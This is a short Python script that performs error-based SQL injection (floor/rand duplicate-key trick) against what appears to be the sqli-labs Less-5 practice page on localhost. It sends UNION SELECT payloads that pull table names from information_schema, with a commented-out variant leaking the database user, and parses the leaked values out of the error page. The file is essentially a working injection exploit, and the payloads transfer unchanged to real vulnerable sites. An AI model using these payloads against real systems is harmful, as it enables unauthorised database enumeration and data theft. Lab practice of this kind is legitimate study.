#! /usr/bin/env python
# encoding=utf-8
"""
基于报错的注入,原理大概就是计数重复，关键函数就是rand(),floor()
"""

import requests
from lxml import etree
url = "http://127.0.0.1/Less-5?id=1\'"

#payload = 'union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0) *2))a from information_schema.columns group by a --+'
payload = "union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a --+"

req = requests.get(url + payload).text
res = etree.HTML(req)
result = res.xpath('//font/text()')
print result